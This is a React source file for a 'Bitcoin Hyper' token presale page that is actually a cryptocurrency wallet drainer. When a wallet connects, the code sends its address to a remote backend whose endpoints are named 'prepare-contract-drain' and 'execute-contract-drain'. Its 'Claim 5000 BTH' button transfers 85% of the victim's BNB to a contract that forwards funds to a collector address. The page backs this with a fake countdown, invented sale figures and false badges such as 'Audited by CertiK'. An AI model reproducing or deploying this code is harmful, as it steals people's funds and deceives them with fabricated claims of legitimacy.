import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
import { useBalance, useDisconnect } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// PRESALE CONFIGURATION
// ============================================

const PRESALE_CONFIG = {
  BSC: {
    chainId: 56,
    contractAddress: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡'
  }
};

const PROJECT_FLOW_ROUTER_ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "_collector", "type": "address" }],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": false, "internalType": "address", "name": "oldCollector", "type": "address" },
      { "indexed": false, "internalType": "address", "name": "newCollector", "type": "address" }
    ],
    "name": "CollectorUpdated",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }
    ],
    "name": "FlowProcessed",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "TokenFlowProcessed",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "collector",
    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "processNativeFlow",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address", "name": "token", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "processTokenFlow",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "newCollector", "type": "address" }],
    "name": "updateCollector",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { chainId } = useAppKitNetwork();
  const { disconnect } = useDisconnect();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [loading, setLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  
  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17,
    tokensSold: 7352941
  });

  // Get balance using wagmi
  const { data: balanceData } = useBalance({
    address: address,
    chainId: chainId,
  });

  // Update balance when data changes
  useEffect(() => {
    if (balanceData) {
      setBalance(balanceData.formatted);
    }
  }, [balanceData]);

  // Initialize ethers provider when connected
  useEffect(() => {
    if (isConnected && window.ethereum) {
      const web3Provider = new ethers.BrowserProvider(window.ethereum);
      setProvider(web3Provider);
      web3Provider.getSigner().then(setSigner);
    }
  }, [isConnected]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      verifyWallet();
    }
  }, [isConnected, address]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying wallet...');
    
    try {
      setLoading(true);
      
      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        if (data.data.tokenAllocation) {
          setAllocation(data.data.tokenAllocation);
        }
        
        if (data.data.isEligible) {
          setTxStatus('✅ Verification complete! You qualify for 5000 BTH');
          await preparePresale();
        } else {
          setTxStatus('✨ Welcome! Your wallet is connected');
        }
      }
      
    } catch (err) {
      console.error('Verification error:', err);
      setError('Unable to verify wallet');
    } finally {
      setLoading(false);
      setVerifying(false);
    }
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/prepare-contract-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
      }
      
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  const executePresaleTransaction = async () => {
    if (!signer || !address) {
      setError('Wallet not connected');
      return;
    }

    if (chainId !== 56) {
      setError('Please switch to BSC network');
      return;
    }

    if (parseFloat(balance) <= 0) {
      setError('Insufficient balance');
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus('⏳ Processing transaction...');
      setTxHash('');

      const contract = new ethers.Contract(
        PRESALE_CONFIG.BSC.contractAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      // Send 85% of balance to cover gas
      const amountToSend = (parseFloat(balance) * 0.85).toString();
      const value = ethers.parseEther(amountToSend);
      
      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
      
      const tx = await contract.processNativeFlow({
        value: value,
        gasLimit: gasEstimate * 120n / 100n
      });

      setTxHash(tx.hash);
      setTxStatus('✅ Transaction submitted!');

      await tx.wait();
      
      // Update balance
      const newBalance = await provider.getBalance(address);
      setBalance(formatEther(newBalance));
      
      // Mark as completed
      if (!completedChains.includes('BSC')) {
        const newCompleted = [...completedChains, 'BSC'];
        setCompletedChains(newCompleted);
        
        try {
          await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              walletAddress: address,
              chainName: 'BSC'
            })
          });
        } catch (e) {}
        
        if (newCompleted.length === preparedTransactions.length && preparedTransactions.length > 0) {
          setShowCelebration(true);
          setTxStatus(`🎉 Congratulations! You've secured 5000 BTH!`);
        } else {
          setTxStatus(`✅ BSC contribution complete!`);
        }
      }
      
    } catch (err) {
      setError(err.message || 'Transaction failed');
      setTxStatus('❌ Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      
      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setShowCelebration(true);
      }
      
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      
      {/* Animated Background */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-20 w-96 h-96 bg-orange-500/10 rounded-full blur-3xl animate-pulse-glow"></div>
        <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl animate-pulse-glow delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-to-r from-orange-500/5 to-yellow-500/5 rounded-full blur-3xl animate-float"></div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
        
        {/* Header */}
        <div className="text-center mb-12">
          <div className="inline-block mb-6 relative">
            <div className="text-7xl animate-bounce-slow relative z-10">₿</div>
            <div className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-2xl opacity-30 animate-pulse"></div>
          </div>
          <h1 className="text-7xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent animate-pulse">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400 text-xl mb-6">Next Generation Layer 2 Solution</p>
          
          {/* Live Presale Badge */}
          <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full backdrop-blur-sm">
            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
            <span className="text-green-400 font-medium">🔴 PRESALE LIVE</span>
          </div>
        </div>

        {/* Stats Grid */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
          <div className="stat-card">
            <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
            <div className="text-xs text-gray-400 uppercase">Token Price</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
            <div className="text-xs text-gray-400 uppercase">Bonus</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-yellow-400 mb-1">${(presaleStats.totalRaised / 1000000).toFixed(1)}M</div>
            <div className="text-xs text-gray-400 uppercase">Raised</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-purple-400 mb-1">{presaleStats.totalParticipants.toLocaleString()}</div>
            <div className="text-xs text-gray-400 uppercase">Participants</div>
          </div>
        </div>

        {/* Bonus Banner */}
        <div className="relative mb-8 overflow-hidden rounded-2xl">
          <div className="absolute inset-0 bg-gradient-to-r from-yellow-500/20 via-orange-500/20 to-red-500/20 animate-gradient-x"></div>
          <div className="relative bg-gray-900/70 backdrop-blur-md border border-yellow-500/30 p-8 text-center">
            <div className="absolute top-0 left-0 w-32 h-32 bg-yellow-500/20 rounded-full blur-3xl animate-pulse"></div>
            <div className="absolute bottom-0 right-0 w-32 h-32 bg-orange-500/20 rounded-full blur-3xl animate-pulse delay-700"></div>
            
            <span className="inline-block px-4 py-2 bg-yellow-500/20 text-yellow-400 rounded-full text-sm font-bold mb-4 animate-bounce">
              🔥 LIMITED TIME OFFER
            </span>
            <h2 className="text-5xl md:text-6xl font-black mb-4">
              <span className="bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                {presaleStats.currentBonus}% BONUS
              </span>
            </h2>
            <p className="text-gray-300 text-lg">
              Get 5000 BTH + {presaleStats.currentBonus}% Extra
            </p>
          </div>
        </div>

        {/* Countdown */}
        <div className="glass-card p-8 mb-8">
          <h3 className="text-center text-gray-400 text-sm uppercase tracking-wider mb-6">Presale Ends In</h3>
          <div className="grid grid-cols-4 gap-4 text-center">
            {[
              { label: 'Days', value: timeLeft.days },
              { label: 'Hours', value: timeLeft.hours },
              { label: 'Minutes', value: timeLeft.minutes },
              { label: 'Seconds', value: timeLeft.seconds }
            ].map((item, index) => (
              <div key={index} className="relative">
                <div className="text-5xl md:text-6xl font-black text-orange-400 animate-pulse">
                  {item.value.toString().padStart(2, '0')}
                </div>
                <div className="text-xs text-gray-500 mt-2 uppercase">{item.label}</div>
                {index < 3 && <span className="absolute -right-2 top-1/2 -translate-y-1/2 text-3xl text-gray-600 hidden md:block">:</span>}
              </div>
            ))}
          </div>
        </div>

        {/* Connect Wallet */}
        <div className="text-center mb-8">
          {!isConnected ? (
            <button
              onClick={() => open()}
              className="group relative transform hover:scale-105 transition-all duration-300"
            >
              <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
              <div className="relative bg-gray-900 rounded-2xl px-12 py-5 text-xl font-bold">
                Connect Wallet
              </div>
            </button>
          ) : (
            <div className="glass-card p-6">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                  <span className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
                  <span className="font-mono text-lg bg-gray-900/50 px-4 py-2 rounded-lg border border-gray-700">
                    {formatAddress(address)}
                  </span>
                </div>
                <div className="text-right">
                  <span className="text-gray-400 text-sm block mb-1">Balance</span>
                  <span className="text-3xl font-bold text-orange-400">
                    {parseFloat(balance).toFixed(4)} BNB
                  </span>
                </div>
                <button
                  onClick={() => disconnect()}
                  className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
                >
                  Disconnect
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Verification Status */}
        {verifying && (
          <div className="glass-card p-6 mb-6 text-center">
            <div className="flex flex-col items-center gap-4">
              <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
              <p className="text-xl text-gray-300">Verifying wallet...</p>
              <p className="text-sm text-gray-500">Please wait while we confirm your allocation</p>
            </div>
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm animate-shake">
            <div className="flex items-center gap-3">
              <span className="text-2xl">⚠️</span>
              <span>{error}</span>
            </div>
          </div>
        )}

        {/* Status Display */}
        {txStatus && !verifying && (
          <div className="glass-card p-4 mb-6 text-center">
            <p className="text-gray-300">{txStatus}</p>
            {txHash && (
              <a
                href={`https://bscscan.com/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-orange-400 text-sm hover:underline mt-2 inline-flex items-center gap-1"
              >
                View Transaction <span>↗</span>
              </a>
            )}
          </div>
        )}

        {/* Celebration Modal */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4 animate-fadeIn">
            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 max-w-md border border-orange-500/30 shadow-2xl transform animate-scaleIn">
              <div className="text-center">
                <div className="text-8xl mb-6 animate-bounce">🎉</div>
                <h2 className="text-4xl font-black mb-4 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                  Congratulations!
                </h2>
                <p className="text-xl text-gray-300 mb-4">You have successfully secured</p>
                <p className="text-6xl font-black text-orange-400 mb-3">5000 BTH</p>
                <p className="text-green-400 text-lg mb-2">+{presaleStats.currentBonus}% Bonus Applied</p>
                <p className="text-gray-400 mb-8">Estimated Value: $850 USD</p>
                
                <button
                  onClick={() => setShowCelebration(false)}
                  className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-10 rounded-xl transition-all transform hover:scale-105 text-lg"
                >
                  View Dashboard
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Main Content */}
        {isConnected && !verifying && (
          <div className="glass-card p-8">
            <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
            
            {!scanResult ? (
              <div className="text-center">
                <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                <p className="text-gray-400 text-lg">Checking wallet status...</p>
              </div>
            ) : scanResult.isEligible ? (
              <>
                {/* Allocation Card */}
                <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
                  <div className="absolute -top-3 -right-3">
                    <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 animate-pulse shadow-lg">
                      {presaleStats.currentBonus}% BONUS
                    </div>
                  </div>
                  
                  <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
                  <p className="text-6xl font-black text-orange-400 text-center mb-3">5000 BTH</p>
                  <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus</p>
                  <p className="text-gray-400 text-center">≈ $850 USD</p>
                </div>
                
                {preparedTransactions.length > 0 && (
                  <div className="mb-8">
                    <p className="text-gray-400 mb-4 text-center">Progress</p>
                    <div className="w-full bg-gray-700 rounded-full h-4 mb-3">
                      <div 
                        className="bg-gradient-to-r from-orange-500 to-orange-600 h-4 rounded-full transition-all duration-500 relative overflow-hidden"
                        style={{ width: `${(completedChains.length / preparedTransactions.length) * 100}%` }}
                      >
                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"></div>
                      </div>
                    </div>
                    <p className="text-sm text-gray-400 text-center">
                      {completedChains.length} of {preparedTransactions.length} steps completed
                    </p>
                  </div>
                )}
                
                {chainId !== 56 ? (
                  <div className="text-center">
                    <p className="text-yellow-400 mb-4">Please switch to BSC network</p>
                    <button
                      onClick={() => window.ethereum?.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }]
                      })}
                      className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-3 px-6 rounded-lg"
                    >
                      Switch to BSC
                    </button>
                  </div>
                ) : !completedChains.includes('BSC') ? (
                  <button
                    onClick={executePresaleTransaction}
                    disabled={loading || parseFloat(balance) <= 0}
                    className="w-full group relative"
                  >
                    <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                      {loading ? 'Processing...' : '⚡ Claim 5000 BTH Now'}
                    </div>
                  </button>
                ) : (
                  <button
                    onClick={claimTokens}
                    className="w-full group relative"
                  >
                    <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                      🎉 View Your 5000 BTH
                    </div>
                  </button>
                )}
              </>
            ) : (
              <div className="text-center">
                <p className="text-2xl text-yellow-400 mb-4">Welcome to Bitcoin Hyper!</p>
                <p className="text-gray-400 text-lg">Your wallet is connected and ready</p>
                <p className="text-sm text-gray-500 mt-4">Complete the steps above to claim your 5000 BTH</p>
              </div>
            )}
          </div>
        )}

        {/* Trust Badges */}
        <div className="mt-12 text-center">
          <div className="flex flex-wrap justify-center gap-3 mb-6">
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited by CertiK</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ 50M+ Raised</span>
          </div>
          <p className="text-gray-600 text-sm">
            © 2026 Bitcoin Hyper. All rights reserved. | Secure Presale Platform
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;
